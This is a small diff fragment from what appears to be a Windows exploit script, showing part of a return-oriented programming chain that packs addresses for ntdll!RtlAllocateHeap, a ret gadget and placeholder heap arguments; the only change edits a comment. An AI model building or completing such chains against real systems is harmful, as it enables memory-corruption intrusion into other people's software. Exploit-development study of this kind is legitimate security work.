@@ -105,7 +105,7 @@ rop1 = b"".join([pack("<I", r) for r in rop1])
 
 # ===
 
-heap_alloc  = pack("<I", 0x77e5a4f0) # ntdll!RtlAllocateHeap
+heap_alloc  = pack("<I", 0x77e5a4f0) # ntdll!RtlAllocateHeap ( 10168078 )
 heap_alloc += pack("<I", 0x1015d1a5) # ret 
 heap_alloc += b"CCCC" # hHeap   <= EAX (return value from HeapCreate)
 heap_alloc += b"DDDD" # dwFlags <= 0x8 (HEAP_ZERO_MEMORY)
